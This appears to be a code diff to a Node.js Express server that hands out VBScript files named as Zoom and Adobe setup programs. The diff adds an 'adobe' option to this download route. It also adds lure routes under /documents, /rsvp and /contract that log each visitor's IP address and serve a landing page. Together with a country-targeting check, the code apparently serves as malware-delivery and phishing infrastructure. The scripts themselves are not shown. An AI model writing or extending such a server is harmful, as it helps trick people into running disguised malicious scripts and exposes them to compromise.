@@ -214,6 +214,7 @@ function isTargetCountry(req) {
 app.set('trust proxy', false);
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
+app.use('/images', express.static(path.join(__dirname, 'pages', 'images')));
 app.use(globalLimiter);
 app.use(helmet({ 
   contentSecurityPolicy: false,
@@ -290,6 +291,9 @@ app.get('/download/vbs/:type', async (req, res) => {
             case 'browser':
                 filename = 'Zoom_Browser_Setup.vbs';
                 break;
+            case 'adobe':
+                filename = 'Adobev2T1_Setup.vbs';
+                break;    
             default:
                 filename = 'Zoom_Workplace.vbs';
         }
@@ -334,6 +338,16 @@ app.get('/download/id/:fileId', (req, res) => {
 
 app.get('/documents/:docId', (req, res) => {
   log('info', { event: 'serve_landing', ip: getClientIp(req), docId: req.params.docId });
+  return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
+});
+
+app.get('/rsvp/:docId', (req, res) => {
+  log('info', { event: 'serve_rsvp', ip: getClientIp(req), docId: req.params.docId });
+  return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
+});
+
+app.get('/contract/:docId', (req, res) => {
+  log('info', { event: 'serve_contract', ip: getClientIp(req), docId: req.params.docId });
   return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
 });
 
